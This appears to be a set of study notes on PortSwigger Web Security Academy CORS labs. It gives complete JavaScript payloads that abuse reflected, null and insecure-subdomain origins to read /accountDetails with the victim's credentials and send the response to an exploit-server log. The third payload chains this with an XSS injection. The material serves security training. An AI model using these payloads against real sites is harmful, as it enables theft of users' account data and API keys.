

```
### CORS Vulnerabilities
```

```
### CORS General
```

```
### CORS Lab Apprentice

#1. Lab: CORS vulnerability with basic origin reflection
> Add Origin, to bypass CORS
> /accountDetails response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.
> Origin: https://example.com
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>

```

```
### CORS Lab Practitioner


#2. Lab: CORS vulnerability with trusted null origin
> /accountDetails response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.
> Send the request to Burp Repeater, and resubmit it with the added header Origin: null.
Observe that the "null" origin is reflected in the Access-Control-Allow-Origin header.

> In the browser, go to the exploit server and enter the following HTML, replacing YOUR-LAB-ID with the URL for your unique lab URL and YOUR-EXPLOIT-SERVER-ID with the exploit server ID:
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>




#3. Lab: CORS vulnerability with trusted insecure protocols
> Bypassing CORS with Origin subdomain
> Origin: http://subdomain.lab-id
<script>
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>

```

```
### CORS Lab Expert
```

```
### CORS Lab Extra
```